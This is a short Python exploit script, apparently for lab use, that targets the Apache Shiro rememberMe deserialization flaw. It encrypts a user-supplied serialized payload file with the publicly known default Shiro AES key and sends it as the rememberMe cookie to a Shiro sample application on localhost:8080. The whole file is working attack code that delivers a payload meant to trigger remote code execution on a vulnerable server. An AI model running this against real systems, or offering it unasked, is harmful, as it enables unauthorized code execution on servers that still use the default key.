import sys
from datetime import datetime
from Crypto.Cipher import AES
import uuid
import base64
import requests


def get_file_data(filename):
    with open(filename, "rb") as f:
        data = f.read()
        f.close()
    return data


def aes_encode(ser_bin):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(ser_bin)))
    return base64_ciphertext.decode("utf-8")


def exp(cipher):
    cookies = {
        'rememberMe': cipher,
    }

    headers = {
        'Host': 'localhost:8080',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'sec-ch-ua': '"-Not.A/Brand";v="8", "Chromium";v="102"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Referer': 'http://localhost:8080/samples_web_war/login.jsp',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    requests.get('http://localhost:8080/samples_web_war/', cookies=cookies, headers=headers)


if __name__ == '__main__':
    filename = sys.argv[1]
    exp(aes_encode(get_file_data(filename)))
    print('success:{}'.format(datetime.now()))
